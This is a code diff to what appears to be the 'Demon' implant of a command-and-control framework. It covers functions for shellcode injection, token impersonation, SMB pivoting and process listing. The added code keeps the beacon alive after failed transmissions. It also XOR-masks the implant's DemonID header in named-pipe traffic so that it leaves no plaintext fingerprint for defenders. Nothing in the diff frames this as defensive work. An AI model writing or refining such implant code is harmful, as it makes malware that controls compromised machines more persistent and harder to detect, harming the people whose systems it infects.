@@ -10,6 +10,7 @@
 #include <core/Download.h>
 #include <core/Dotnet.h>
 #include <core/Kerberos.h>
+#include <core/Runtime.h>
 #include <core/CoffeeLdr.h>
 #include <inject/Inject.h>
 
@@ -75,10 +76,21 @@ VOID CommandDispatcher( VOID )
         }
 
 #ifdef TRANSPORT_HTTP
-        /* Send our buffer. */
-        if ( ! PackageTransmitAll( &DataBuffer, &DataBufferSize ) && ! HostCheckup() )
+        /* [BUGFIX-004 2026-03-29] Separate failure detection from the HostCheckup.
+         * Previously, a failed PackageTransmitAll (network error, server error, etc.)
+         * left DataBuffer=NULL and DataBufferSize stale, always triggering the
+         * else { break } path below and permanently killing the beacon.  Instead,
+         * retry after the next sleep cycle unless all known hosts are exhausted. */
+        if ( ! PackageTransmitAll( &DataBuffer, &DataBufferSize ) )
         {
-            CommandExit( NULL );
+            if ( ! HostCheckup() )
+            {
+                CommandExit( NULL );
+            }
+            /* Transient error — reset state and retry after next SleepObf. */
+            DataBuffer     = NULL;
+            DataBufferSize = 0;
+            continue;
         }
 
 /* SMB */
@@ -133,8 +145,18 @@ VOID CommandDispatcher( VOID )
         else
         {
 #ifdef TRANSPORT_HTTP
-            PUTS( "TransportSend: Failed" )
-            break;
+            /* [BUGFIX-004 2026-03-29] PackageTransmitAll returned TRUE but the
+             * server response is empty (HTTP 200 with no body, or Base64Decode
+             * of an empty response returned size=0).  Free any 1-byte placeholder
+             * allocation from Base64Decode and retry after the next sleep cycle
+             * instead of permanently killing the beacon. */
+            PUTS( "Server returned empty response — retrying after sleep" )
+            if ( DataBuffer ) {
+                Instance->Win32.LocalFree( DataBuffer );
+                DataBuffer = NULL;
+            }
+            DataBufferSize = 0;
+            continue;
 #endif
         }
 
@@ -615,7 +637,7 @@ VOID CommandProcList(
             }
 
             /* Now we append the collected process data to the process list  */
-            PackageAddBytes( Package, SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
+            PackageAddBytes( Package, (PBYTE) SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
             PackageAddInt32( Package, U_PTR( SysProcessInfo->UniqueProcessId ) );
             PackageAddInt32( Package, x86 );
             PackageAddInt32( Package, U_PTR( SysProcessInfo->InheritedFromUniqueProcessId ) );
@@ -697,7 +719,7 @@ VOID CommandFS( PPARSER Parser )
             LPWSTR           Ends         = NULL;
             PDIR_OR_FILE     DirOrFile    = NULL;
             PDIR_OR_FILE     TmpDirOrFile = NULL;
-            UINT32           PathSize     = NULL;
+            UINT32           PathSize     = 0;
 
             FileExplorer = ParserGetBool( Parser );
             TargetFolder = ParserGetWString( Parser, NULL );
@@ -1272,9 +1294,9 @@ VOID CommandInjectShellcode(
     DWORD     Method  = 0;
     BOOL      x64     = FALSE;
     PVOID     Payload = NULL;
-    DWORD     Size    = 0;
+    UINT32    Size    = 0;
     PVOID     Argv    = NULL;
-    DWORD     Argc    = 0;
+    UINT32    Argc    = 0;
     DWORD     Pid     = 0;
     LPWSTR    Spawn   = NULL;
     PROC_INFO PcInfo  = { 0 };
@@ -1390,7 +1412,7 @@ VOID CommandToken( PPARSER Parser )
             if ( TokenData )
             {
                 PackageAddInt32( Package, ImpersonateTokenInStore( TokenData ) );
-                PackageAddString( Package, TokenData->DomainUser );
+                PackageAddString( Package, (PCHAR) TokenData->DomainUser );
             }
             else
             {
@@ -1538,7 +1560,7 @@ VOID CommandToken( PPARSER Parser )
             PWCHAR lpUser         = ParserGetWString( Parser, &dwUserSize );
             PWCHAR lpPassword     = ParserGetWString( Parser, &dwPasswordSize );
             DWORD  LogonType      = ParserGetInt32( Parser );
-            CHAR   Deli[ 2 ]      = { '\\', 0 };
+            WCHAR  Deli[ 2 ]      = { L'\\', 0 };
             HANDLE hToken         = NULL;
             PWCHAR UserDomain     = NULL;
             LPWSTR BufferUser     = NULL;
@@ -2565,6 +2587,7 @@ VOID CommandPivot( PPARSER Parser )
             if ( ! Data.Buffer || ! Data.Length )
             {
                 PUTS( "Can't send empty data to pivot" )
+                PackageDestroy( Package );
                 return;
             }
 
@@ -2583,6 +2606,21 @@ VOID CommandPivot( PPARSER Parser )
 
             if ( PivotData )
             {
+                /* [HVC-008 2026-03-28] Mask the [DemonId][PackageSize] framing header
+                 * before writing to the child's named pipe so the static DemonID does
+                 * not appear as a plaintext fingerprint in the pipe stream.
+                 * The child Demon unmasks in SmbRecv using the same constants. */
+                if ( Data.Buffer && Data.Length >= 8 )
+                {
+                    UINT32 FrameId, FrameSize;
+                    MemCopy( &FrameId,                  Data.Buffer,     sizeof( UINT32 ) );
+                    MemCopy( &FrameSize, (PUCHAR) Data.Buffer + 4, sizeof( UINT32 ) );
+                    FrameId   ^= HEADER_MASK_SEED;
+                    FrameSize ^= ( HEADER_MASK_SEED >> 8 );
+                    MemCopy( Data.Buffer,                    &FrameId,   sizeof( UINT32 ) );
+                    MemCopy( (PUCHAR) Data.Buffer + 4, &FrameSize, sizeof( UINT32 ) );
+                }
+
                 if ( ! PipeWrite( PivotData->Handle, &Data ) )
                 {
                     PUTS( "PipeWrite failed" )
@@ -2595,6 +2633,7 @@ VOID CommandPivot( PPARSER Parser )
             // DEMON_PIVOT_SMB_COMMAND does not send any response
             // TODO: send confirmation that it worked?
             //       this message colides with PivotPush
+            PackageDestroy( Package );
             return;
         }
 
@@ -3469,7 +3508,7 @@ VOID CommandExit( PPARSER Parser )
      */
 
     ImageBase = Instance->Session.ModuleBase;
-    ImageSize = NULL;
+    ImageSize = 0;
 
     RopExit.ContextFlags = CONTEXT_FULL;
     Instance->Win32.RtlCaptureContext( &RopExit );
